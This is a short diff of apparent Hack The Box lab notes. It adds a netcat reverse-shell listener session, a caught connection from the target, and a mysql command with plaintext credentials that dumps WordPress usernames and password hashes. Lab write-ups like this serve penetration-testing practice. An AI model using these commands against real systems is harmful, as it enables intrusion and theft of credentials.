@@ -2,3 +2,13 @@
 mysql -u shaun -ppassword -D wordpress -e "SELECT user_login, user_pass FROM wp_users;"
 
 use wordpress; show tables;
+
+┌─[eu-dedi-pro-61]─[10.10.14.64]─[lukaszfd84@htb-x64wczkesu]─[~]
+└──╼ [★]$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.64] from (UNKNOWN) [10.10.110.100] 56104
+mysql -u shaun -ppassword -D wordpress -e "SELECT user_login, user_pass FROM wp_users;"
+mysql: [Warning] Using a password on the command line interface can be insecure.
+user_login	user_pass
+admin	$P$BkTfSjp9TVOaxVgalnY8xxp3N6CEVR1
+james	$P$B/kdWnMDyh1oMT0QCG9YAyEu8Yt.M0.
